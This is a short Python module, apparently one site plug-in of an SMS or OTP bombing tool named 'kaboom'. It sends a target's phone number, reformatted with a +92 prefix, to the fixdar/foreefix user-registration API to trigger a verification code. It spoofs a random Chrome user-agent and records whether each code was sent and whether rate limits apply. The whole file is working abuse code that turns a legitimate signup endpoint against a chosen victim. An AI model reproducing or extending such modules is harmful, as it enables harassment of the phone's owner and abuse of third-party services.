from kaboom.core import *
from kaboom.localuseragent import *
from requests_toolbelt.multipart.encoder import MultipartEncoder

async def fixdar(phone, client, out):
    name = "fixdar"
    domain = "fixdar"
    frequent_rate_limit = False

    headers = {
        'Origin': 'https://www.fixdar.com',
        'Referer': 'https://www.fixdar.com/',

        'User-Agent': random.choice(ua["browsers"]["chrome"]),
      
    }

    # Define the multipart form data and get the raw bytes
    m = MultipartEncoder(
        fields={
            'phone_number': f"+92{phone[-10:]}",  # International format
        }
    )
    headers['Content-Type'] = m.content_type
    data = m.to_string()  # Convert to raw bytes

    try:
        response = await client.post('https://foreefix.com/foreefix-api/api/web_user_register', headers=headers, content=data)
        
        # Process the JSON response
        data = response.json()
        if data.get('message') == "code generated":
            out.append({"name": name, "domain": domain, "frequent_rate_limit": frequent_rate_limit, "rateLimit": False, "sent": True, "error": False})
        else:
            reason = data.get("message") or data.get("error") or "otp request failed"
            if data.get("code"):
                reason = f"{reason} ({data.get('code')})"
            out.append({"name": name, "domain": domain, "frequent_rate_limit": frequent_rate_limit, "rateLimit": False, "sent": False, "error": True, "reason": reason})

    except Exception as e:
        out.append({"name": name, "domain": domain, "frequent_rate_limit": frequent_rate_limit, "rateLimit": False, "sent": False, "error": True, "reason": str(e) or type(e).__name__})
